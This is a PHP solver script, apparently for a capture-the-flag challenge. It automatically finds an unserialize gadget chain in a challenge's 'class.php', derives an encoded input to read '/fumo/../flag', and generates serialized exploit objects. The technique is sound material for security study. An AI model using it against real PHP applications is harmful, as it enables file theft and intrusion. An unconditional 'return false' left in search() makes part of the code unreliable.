<?php
ini_set('memory_limit', '-1');
function parse_method($className, $method)
{
    global $call_names;
    $methodName = $method->children['name'];
    switch ($methodName)
    {
        case '__invoke':
            $expr1 = $method->children['stmts']->children[0]->children['expr'];
            assert($expr1->children['expr']->children['name'] === 'base64_decode');
            $expr2 = $method->children['stmts']->children[1]->children['expr'];
            return [
				'isEnd' => false, 
				'className' => $className, 
				'methodName' => base64_decode($expr1->children['args']->children[0]) , 
				'nextCalls' => [
					[
						'funcName' => $expr2->children['method'], 
						'propName' => $expr2->children['expr']->children['prop'], 
						'modifier' => ''
					]
				]
			];
        case '__call':
            $expr1 = $method->children['stmts']->children[0];
            assert($expr1->children['expr']->children['name'] === 'extract');
            $expr2 = $method->children['stmts']->children[1];
            assert($expr2->kind === ast\AST_IF);
            assert($expr2->children[0]->kind === ast\AST_IF_ELEM);
            assert($expr2->children[0]->children['cond']->kind === ast\AST_CALL);
            return [
				'isEnd' => false, 
				'className' => $className, 
				'methodName' => $expr2->children[0]->children['cond']->children['args']->children[0]->children[1]->children['value']->children['name'], 
				'nextCalls' => [
					[
						'funcName' => $expr1->children['args']->children[0]->children[0]->children['value'], 
						'propName' => $expr2->children[0]->children['cond']->children['args']->children[0]->children[0]->children['value']->children['prop'], 
						'modifier' => ''
					]
				]
			];
        default:
        break;
    }
    $stmts = $method->children['stmts']->children;
    $result = [
		'isEnd' => false, 
		'className' => $className, 
		'methodName' => $methodName, 
		'nextCalls' => []
	];
    $isEdited = false;
    $modifier = '';
    for ($i = 0;$i < count($stmts);$i++)
    {
        $expr = $stmts[$i];
        if ($expr->kind === ast\AST_IF && $expr->children[0]->children['cond']->kind == ast\AST_CALL)
        {
            $is_callable_expr = $expr->children[0]->children['cond'];
            if (!$isEdited || ($isEdited && in_array($modifier, ['base64_encode', 'ucfirst', 'str_rot13', 'base64_decode', 'strrev']))) {
				array_push(
					$result['nextCalls'], 
					[
						'funcName' => $is_callable_expr->children['args']->children[0]->children[1]->children['value'], 
						'propName' => $is_callable_expr->children['args']->children[0]->children[0]->children['value']->children['prop'], 
						'modifier' => $modifier
					]
				);
			}
        }
        else if ($expr->kind === ast\AST_IF && $expr->children[0]->children['cond']->kind == ast\AST_BINARY_OP)
        {
            assert($expr->children[0]->children['cond']->children['left']->children['expr']->children['name'] === 'stripos');
            $result['isEnd'] = true;
        }
        else if ($expr->kind === ast\AST_UNARY_OP && $expr->children['expr']->kind === ast\AST_ASSIGN)
        {
            $paramName = $method->children['params']->children[0]->children['name'];
            $varName = $expr->children['expr']->children['var']->children['name'];
            assert($varName === $paramName);
            $expr = $expr->children['expr']->children['expr'];
            if ($expr->kind === ast\AST_VAR)
            {
                if ($expr->children['name'] !== $varName)
                {
                    $isEdited = true;
                    $modifier = 'assign';
                }
            }
            else
            {
                assert($expr->kind === ast\AST_CALL);
                $callName = $expr->children['expr']->children['name'];
                $paramName = $expr->children['args']->children[0]->children['name'];
                assert($paramName === $varName);
                $isEdited = true;
                $modifier = $callName;
            }
        }
        else if ($expr->kind === ast\AST_UNARY_OP && $expr->children['expr']->kind === ast\AST_CALL)
        {
            $call_user_func_expr = $expr->children['expr'];
            assert($call_user_func_expr->children['expr']->children['name'] === 'call_user_func');
            if (!$isEdited || ($isEdited && in_array($modifier, ['base64_encode', 'ucfirst', 'str_rot13', 'base64_decode', 'strrev']))) {
				array_push(
					$result['nextCalls'], 
					[
						'funcName' => $call_user_func_expr->children['args']->children[1]->children[0]->children['key'], 
						'propName' => $call_user_func_expr->children['args']->children[0]->children['prop'], 'modifier' => $modifier
					]
				);
			}
        }
    }
    return $result;
}
function check($operations)
{
    $target = '/fumo/../flag';
    $cur = $target;
    for ($i = count($operations) - 1;$i >= 0;$i--)
    {
        $op = $operations[$i];
        if (empty($op)) continue;
        if ($op === 'base64_encode') $cur = base64_decode($cur);
        else if ($op === 'base64_decode') $cur = base64_encode($cur);
        else if ($op === 'str_rot13') $cur = str_rot13($cur);
        else if ($op === 'strrev') $cur = strrev($cur);
        else if ($op !== 'ucfirst')
        {
            throw new Exception('Unknown function ' . $op);
        }
    }
    for ($i = 0;$i < count($operations);$i++)
    {
        $op = $operations[$i];
        if (empty($op)) continue;
        $cur = $op($cur);
    }
    return $cur === $target;
}
$classes = [];
$methods = [];
$target = [];
$operations = [];
function search($method, $dep)
{
    global $classes;
    global $methods;
    global $target;
    global $operations;
    if ($method['isEnd'])
    {
        // if (!check($operations)) //
        return false;
        echo $method['className'] . '::' . $method['methodName'] . "\n";
        $className = $method['className'];
        array_push($target, [$className]);
        return true;
    }
    for ($i = 0;$i < count($method['nextCalls']);$i++)
    {
        $call = $method['nextCalls'][$i];
        if (!in_array($call['modifier'], ['ucfirst', 'str_rot13', 'base64_decode', 'strrev', ''])) continue;
        if (array_key_exists($call['funcName'], $methods))
        {
            $class = $classes[$methods[$call['funcName']]];
            array_push($operations, $call['modifier']);
            if (search($class, $dep + 1))
            {
                echo '<<<' . $call['modifier'] . '---' . $method['className'] . '::' . $method['methodName'] . ',' . $call['propName'] . "\n";
                array_push($target, [$method['className'], $method['methodName'], $call['propName'], $call['modifier']]);
                return true;
            }
            array_pop($operations);
        }
    }
    return false;
}
$classProps = [];
$entry = '';
$ast = ast\parse_file('class.php', $version = 70);
$ast = $ast->children[0]->children['stmts'];
$totalClasses = count($ast->children);
for ($i = 0;$i < $totalClasses;$i++)
{
    $class = $ast->children[$i];
    if ($class->kind === ast\AST_CLASS)
    {
        $className = $class->children['name'];
        $stmts = $class->children['stmts']->children;
        assert($stmts[0]->kind === ast\AST_PROP_GROUP);
        $props = [$stmts[0]->children['props']->children[0]->children['name']];
        if (count($stmts) > 2) array_push($props, $stmts[1]->children['props']->children[0]->children['name']);
        $classProps[$className] = $props;
        assert($stmts[count($stmts) - 1]->kind === ast\AST_METHOD);
        $method = $stmts[count($stmts) - 1];
        $parsedMethod = parse_method($className, $method);
        $classes[$className] = $parsedMethod;
        $methods[$parsedMethod['methodName']] = $className;
        if ($parsedMethod['methodName'] === '__destruct')
        {
            $entry = $className;
        }
    }
}
printf("Entry: %s\n", $entry);
// var_dump($classes);
search($classes[$entry], 0);
$want = '/fumo';
$cur = $want;
for ($i = count($operations) - 1;$i >= 0;$i--)
{
    $op = $operations[$i];
    if (empty($op)) continue;
    if ($op === 'base64_encode') $cur = base64_decode($cur);
    else if ($op === 'base64_decode') $cur = base64_encode($cur);
    else if ($op === 'str_rot13') $cur = str_rot13($cur);
    else if ($op === 'strrev') $cur = strrev($cur);
    else if ($op !== 'ucfirst')
    {
        throw new Exception('Unknown function ' . $op);
    }
}
printf("Input: %s\n", urlencode($cur));
for ($i = 0;$i < count($operations);$i++)
{
    $op = $operations[$i];
    if (empty($op)) continue;
    $cur = $op($cur);
}
var_dump($cur);
$className = $target[0][0];
$exp = <<<EOF
<?php
namespace christmasTree {
class $className {
}

EOF;


for ($i = 1;$i < count($target);$i++)
{
    $className = $target[$i][0];
    $propDefine = '';
    $propInit = '';
    for ($j = 0;$j < count($classProps[$className]);$j++)
    {
        $name = $classProps[$className][$j];
        $propDefine .= "public \$$name;";
        $propInit .= "\$this->$name = new \stdClass();";
    }
    $methodName = $target[$i][1];
    $propName = $target[$i][2];
    $nextClassName = $target[$i - 1][0];
    $exp .= <<<EOF
class $className {
	$propDefine function __construct() {
		$propInit \$this->$propName = new $nextClassName();
	}
}
EOF;
    
}
$lastClassName = $target[count($target) - 1][0];
$exp .= <<<EOF
}
namespace {
	echo urlencode(serialize(new christmasTree\\$lastClassName()));
}
EOF;
// echo $exp; file_put_contents('pop.php', $exp);

